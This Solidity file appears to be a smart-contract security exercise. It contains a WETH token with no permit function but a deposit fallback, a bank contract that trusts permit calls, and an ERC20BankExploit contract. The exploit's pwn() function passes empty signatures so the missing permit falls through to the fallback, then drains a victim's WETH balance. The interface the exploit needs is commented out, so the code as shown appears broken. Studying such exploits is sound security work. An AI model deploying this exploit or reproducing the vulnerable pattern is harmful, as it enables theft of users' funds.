// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./ERC20.sol";
import "./IERC20.sol";

contract WETH is ERC20 {
    event Deposit(address indexed account, uint256 amount);
    event Withdraw(address indexed account, uint256 amount);

    constructor() ERC20("Wrapped Ether", "WETH", 18) {}

    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 _amount) external {
        _burn(msg.sender, _amount);
        payable(msg.sender).transfer(_amount);
        emit Withdraw(msg.sender, _amount);
    }
}

interface IERC20Permit is IERC20 {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint256) public balanceOf;

    constructor(address _token) {
        token = IERC20Permit(_token);
    }

    function depositWithPermit(
        address owner,
        address spender,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        token.permit(owner, spender, amount, deadline, v, r, s);
        token.transferFrom(owner, address(this), amount);
        balanceOf[spender] += amount;
    }

    function deposit(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
    }

    function withdraw(uint256 _amount) external {
        balanceOf[msg.sender] -= _amount;
        token.transfer(msg.sender, _amount);
    }
}

// import "./IERC20Permit.sol";
// import "./ERC20.sol";

// interface IERC20Bank {
//     function deposit(uint256 _amount) external;

//     function withdraw(uint256 _amount) external;

//     function token() external view returns (address);

//     function depositWithPermit(
//         address owner,
//         address spender,
//         uint256 amount,
//         uint256 deadline,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external;
// }

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn(address alice) external {
        address weth = IERC20Bank(target).token();
        uint256 bal = IERC20(weth).balanceOf(alice);
        IERC20Bank(target).depositWithPermit(
            alice,
            address(this),
            bal,
            0,
            0,
            "",
            ""
        );
        IERC20Bank(target).withdraw(bal);
    }
}
